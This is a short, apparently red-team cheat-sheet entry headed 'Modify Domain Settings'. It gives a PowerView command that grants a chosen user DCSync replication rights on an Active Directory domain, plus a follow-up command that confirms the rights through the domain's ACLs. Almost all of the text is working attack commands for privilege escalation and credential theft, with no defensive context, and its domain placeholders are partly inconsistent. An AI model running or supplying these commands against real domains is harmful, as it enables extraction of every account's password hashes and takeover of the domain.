# Modify Domain Settings

## Allow Your User To Execute DCSync Attack

Allow your user to execute DCSync attack.

```
. C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=test,DC=test.corp,DC=local' -PrincipalIdentity test -Rights DCSync -PrincipalDomain test.corp.local -TargetDomain test.local -Verbose
```

Verify using the following command.

```
Get-DomainObjectAcl -SearchBase "DC=test.corp,DC=test.corp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "test"}
```
